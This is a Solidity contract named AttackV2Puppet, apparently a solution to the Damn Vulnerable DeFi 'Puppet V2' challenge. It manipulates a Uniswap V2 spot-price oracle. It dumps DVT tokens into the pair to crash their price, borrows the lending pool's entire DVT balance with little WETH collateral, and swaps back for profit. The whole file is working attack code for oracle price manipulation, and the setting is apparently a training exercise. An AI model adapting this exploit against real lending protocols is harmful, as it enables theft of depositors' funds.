// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.6.0;

import "./PuppetV2Pool.sol";
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';
import "hardhat/console.sol";

contract AttackV2Puppet{
    using SafeMath for uint256;

    PuppetV2Pool pool;
    IERC20 dvt;
    IERC20 weth;
    IUniswapV2Pair pair;
    IUniswapV2Router02 router;
    IUniswapV2Factory factory;

    constructor(address _pool, address _router, address _token, address _weth, address _pair, address _factory) payable public
    {
        dvt = IERC20(_token);
        weth = IERC20(_weth);
        pool = PuppetV2Pool(_pool);
        pair = IUniswapV2Pair(_pair);
        router = IUniswapV2Router02(_router);
        factory = IUniswapV2Factory(_factory);
    }

    function attack() external
    {
        //transfer all the tokens and weth from the owner to this contract
        dvt.transferFrom(msg.sender, address(this), dvt.balanceOf(msg.sender));
        weth.transferFrom(msg.sender, address(this), weth.balanceOf(msg.sender));

        //We do this until we have no more tokens in the pool

        //PHASE 1: Swapping at the AMM
        //approve the router to spend our tokens
        dvt.approve(address(router), dvt.balanceOf(address(this)));

        //generate the path
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);

        //swap our tokens for eth
        router.swapExactTokensForTokens(dvt.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);

        //PHASE 2: Lending out as much as we can
        //calculate how many tokens we can lend out
        uint256 max_lend = maxLend(weth.balanceOf(address(this)));

        //we need to exactly calculate how to get the rest out
        console.log("Final Lending");

        //calculate how much weth we need to send to get the rest of the tokens out
        uint256 final_value_sent = neededCollateral(dvt.balanceOf(address(pool)));

        //approve so it can use transferFrom()
        weth.approve(address(pool), final_value_sent);
        pool.borrow(dvt.balanceOf(address(pool)));
        
        //generate the new path
        path[0] = address(weth);
        path[1] = address(dvt);

        //swap our tokens for eth
        weth.approve(address(router), weth.balanceOf(address(this)));
        router.swapExactTokensForTokens(weth.balanceOf(address(this)), 1, path, address(this), block.timestamp + 42069);

        //transfer all our tokens to the player
        dvt.transfer(msg.sender, dvt.balanceOf(address(this)));
    }

    //Collateral calculation
    function neededCollateral(uint256 amount) private view returns (uint256) {
        //retrieve the reserves of the pair from the factory
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(address(factory), address(weth), address(dvt));

        //calculate quote
        uint256 oraclequote =  UniswapV2Library.quote(amount.mul(10 ** 18), reservesToken, reservesWETH);

        return (oraclequote * 3) / (1 ether);
    }

    //Max lend we will get for our WETH
    function maxLend(uint256 amount) private view returns (uint256) {
        //TODO: Possibly some fuckery in here

        //retrieve the reserves of the pair from the factory
        (uint256 reservesWETH, uint256 reservesToken) = UniswapV2Library.getReserves(address(factory), address(weth), address(dvt));

        return UniswapV2Library.quote(amount.mul(10 ** 18), reservesWETH, reservesToken) / (3 ether);
    }
}